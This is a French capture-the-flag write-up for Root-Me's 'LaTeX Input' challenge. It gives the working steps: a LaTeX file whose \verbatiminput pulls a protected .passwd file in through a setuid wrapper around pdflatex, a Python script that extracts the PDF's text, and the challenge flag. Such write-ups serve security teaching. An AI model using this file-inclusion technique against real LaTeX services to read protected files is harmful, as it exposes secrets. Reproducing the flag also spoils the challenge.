## Source et énoncé du CTF

<https://www.root-me.org/fr/Challenges/App-Script/LaTeX-Input>

## Write-up

Après la connexion au challenge, on peut affichier l'identité de l'utilisateur du challenge :
```bash
app-script-ch23@challenge02:~$ whoami
app-script-ch23
```

On peut également afficher les éléments présents dans le répertoire principal :
```bash
app-script-ch23@challenge02:~$ ll
total 676
drwxr-x---  2 app-script-ch23-cracked app-script-ch23           4096 Dec 10  2021 ./
drwxr-xr-x 25 root                    root                      4096 Sep  5  2023 ../
-r--------  1 root                    root                       802 Dec 10  2021 ._perms
-rw-r-----  1 root                    root                        43 Dec 10  2021 .git
-r--------  1 app-script-ch23-cracked app-script-ch23-cracked     93 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch23-cracked app-script-ch23            893 Dec 10  2021 ch23.sh*
-rwsr-x---  1 app-script-ch23-cracked app-script-ch23         661788 Dec 10  2021 setuid-wrapper*
-r--r-----  1 app-script-ch23-cracked app-script-ch23            262 Dec 10  2021 setuid-wrapper.c
```

Plusieurs fichiers sont intéressants :
- *.passwd* : le fichier contenant le flag du challenge
- *ch23.sh* : un script Bash permettant la compilation automatique d'un fichier .tex en fichier .pdf via le binaire *pdflatex*
- *setuid-wrapper.c* compilé dans *setuid-wrapper* : un programme langagec C permettant d'exécuter le script bash *ch23.sh*

On remarque notamment que seul l'utilisateur *app-script-ch23-cracked* peut afficher le contenu du fichier *.passwd*.

Le code de *setuid-wrapper.c* est donné par :
```bash
app-script-ch23@challenge02:~$ cat setuid-wrapper.c
#include <unistd.h>

/* setuid script wrapper */

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch23/ch23.sh", arv[1] , NULL };
    setreuid(geteuid(), geteuid());
    execve(argv[0], argv, NULL);
    return 0;
}
```
L'objectif de ce code est de permettre l'exécution du script */challenge/app-script/ch23/ch23.sh* avec les droits appliqués sur le fichier *setuid-wrapper.c*.

Or, le fichier *setuid-wrapper.c* a le SUID bit positionné, ce qui signifie que l'exécution du script */challenge/app-script/ch23/ch23.sh* par l'intermédiaire de *setuid-wrapper.c* plutôt que par l'exécution directe du script */challenge/app-script/ch23/ch23.sh* permet l'exécution de ce script avec les droits de l'utilisateur propriétaire du fichier *setuid-wrapper.c* (*app-script-ch23-cracked*) plutot qu'avec les droits de l'utilateur qui exécuterait directement le script */challenge/app-script/ch23/ch23.sh* (*app-script-ch23*).

L'intérêt principal repose ici sur le fait que le fichier *.passwd* n'est lisible que par l'utilisateur *app-script-ch23-cracked*, et donc qu'en utilisant le binaire *setuid-wrapper* pour exécuter le script */challenge/app-script/ch23/ch23.sh*, on allait pouvoir trouver un moyen d'afficher le contenu du fichier *.passwd*.

Analysons mantenant le contenu du script */challenge/app-script/ch23/ch23.sh* : 
```bash
app-script-ch23@challenge02:~$ cat ch23.sh
#!/usr/bin/env bash

if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi

if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"

    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```
Le point important a relever est l'option *-no-shell-escape* utilisée pour la compilation du fichier .tex par la commande *pdflatex*. Cette option permet de désactiver la capacité de LaTeX à exécuter des commandes shell depuis le document compilé. Mais ce mécanisme prend en charge la directive LaTex *\write18*, et n'a jamais eu pour vocation de prend en charge les directives LaTex de type inclusion tel que *\input{chemin}*, *\include{chemin}*, *\verbatiminput{chemin}*, ou *\lstinputlisting{chemin}*. En effet, ces directives ne permettent pas explicitement d'exécuter du code sur la machine qui compile, mais simplement d'inclure le contenu d'un fichier externe dans le fichier LaTex compilé. Or, c'est précisément ce mécanisme que l'on cherche à exploiter pour lire le contenu du fichier *.passwd*.

Pour cela, créons un fichier .tex contenant le code suivant :
```bash
app-script-ch23@challenge02:~$ touch /tmp/fic.tex
app-script-ch23@challenge02:~$ vim /tmp/fic.tex
```

```bash
app-script-ch23@challenge02:~$ cat /tmp/fic.tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```
On utilise ici la directive *verbatiminput* plutot que la directive *input* car cette dernière présente des limitations et des erreurs au moment de la compilation, notamment pour l'interprétation des caractères spéciaux. *verbatiminput* insert le contenu du fichier */challenge/app-script/ch23/.passwd* dans le fichier .pdf qui sera généré.

On génère ensuite le fichier .pdf à partir du fichier .tex via le binaire *setuid-wrapper* :
```bash
app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/fic.tex
[+] Compilation ...
[+] Output file : /tmp/tmp.PyeP4LLLal/main.pdf
```

Le problème est que sur la machine, accessible uniquement en ligne de commande, il n'y a pas d'outil prêt à l'emploi pour lire le contenu du fichier .pdf généré. Il n'est pas non plus possible d'en installer. Nous allons donc utiliser Python 3 et le script Python suivant pour lire le contenu du fichier .pdf généré :
```bash
app-script-ch23@challenge02:~$ touch /tmp/script.py
app-script-ch23@challenge02:~$ vim /tmp/script.py
app-script-ch23@challenge02:~$ cat /tmp/script.py
```

```python
import zlib, re
data = open('/tmp/tmp.PyeP4LLLal/main.pdf', 'rb').read()
streams = re.findall(rb'stream\r?\n(.*?)endstream', data, re.DOTALL)
for s in streams:
    try:
        print(zlib.decompress(s).decode('latin-1', errors='ignore'))
    except:
        pass
```

On peut alors lire le contenu du fichier .pdf généré en utilisant le script Python créé précédemment : 
```bash
app-script-ch23@challenge02:~$ python3 /tmp/script.py
BT
/F15 9.9626 Tf 133.768 657.235 Td [(The)-525(flag)-525(is)-525(commented)-525(on)-525(the)-525(next)-525(line)-525(:)]TJ 0 -23.91 Td [(%)-525(LaTeX_1nput_1s_n0t_v3ry_s3kur3)]TJ 0 -23.91 Td [(Did)-525(you)-525(get)-525(it)-525(?)]TJ/F8 9.9626 Tf 169.365 -520.05 Td [(1)]TJ
ET

2 0 1 89 8 152 9 158 11 500 13 703 5 1000 4 1122 7 1246 14 1288
<<
/Type /Page
/Contents 3 0 R
/Resources 1 0 R
/MediaBox [0 0 612 792]
/Parent 7 0 R
>>
<<
/Font << /F15 4 0 R /F8 5 0 R >>
/ProcSet [ /PDF /Text ]
>>
[500]
[525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525]
<<
/Type /FontDescriptor
/FontName /SDXKYB+CMR10
/Flags 4
/FontBBox [-40 -250 1009 750]
/Ascent 694
/CapHeight 683
/Descent -194
/ItalicAngle 0
/StemV 69
/XHeight 431
/CharSet (/one)
/FontFile 10 0 R
>>
<<
/Type /FontDescriptor
/FontName /OHJHVP+CMTT10
/Flags 4
/FontBBox [-4 -233 537 696]
/Ascent 611
/CapHeight 611
/Descent -222
/ItalicAngle 0
/StemV 69
/XHeight 431
/CharSet (/D/L/T/X/a/c/colon/d/e/f/g/h/i/k/l/m/n/o/one/p/percent/question/r/s/t/three/u/underscore/v/x/y/zero)
/FontFile 12 0 R
>>
<<
/Type /Font
/Subtype /Type1
/BaseFont /SDXKYB+CMR10
/FontDescriptor 11 0 R
/FirstChar 49
/LastChar 49
/Widths 8 0 R
>>
<<
/Type /Font
/Subtype /Type1
/BaseFont /OHJHVP+CMTT10
/FontDescriptor 13 0 R
/FirstChar 37
/LastChar 121
/Widths 9 0 R
>>
<<
/Type /Pages
/Count 1
/Kids [2 0 R]
>>
<<
/Type /Catalog
/Pages 7 0 R
>>
```
Le flag est lisible dans la sortie du script.


## Flag

LaTeX_1nput_1s_n0t_v3ry_s3kur3